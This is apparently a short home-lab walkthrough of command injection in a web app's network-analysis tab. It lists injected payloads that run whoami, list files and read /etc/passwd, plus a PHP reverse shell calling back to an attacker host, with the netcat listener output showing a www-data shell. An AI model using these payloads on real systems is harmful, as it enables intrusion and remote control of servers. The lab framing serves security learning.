# Command Injection - Basics

- In the network analysis tab, I am proceeding to conduct command injection to assess the system's vulnerability.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/cd982e2e-b051-4333-8e9d-6046353d2bd7)

- By utilizing the command `https://<IP>; whoami;echo http/`, I successfully fetched the user information.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a5f05fef-23a3-4aba-b031-94fe4f141834)

- By passing the payload `https://<IP>; ls -lah;asd`, I managed to retrieve the files present in the system.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/78f51f72-93a6-4d82-9e01-c61ea3cc351d)

- By utilizing the command `https://<IP>; cat /etc/passwd;asd` I successfully retrieved the user information.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/38d63085-e598-4ef8-8ece-321b48ec0e98)

- By employing the PHP reverse shell `https://<Target IP>; php -r '$sock=fsockopen("LHOST",4242);exec("/bin/sh -i <&3 >&3 2>&3");';asd`, I was able to prompt a reverse shell.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/3b86c2bd-8f91-4032-b2bd-de8e1e55ee19)

#### Shell:

```bash
└─$ rlwrap nc -nvlp 4242
listening on [any] 4242 ...
connect to [xxx.xxx.xxx.186] from (UNKNOWN) [xxx.xx.0.4] 59348
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```
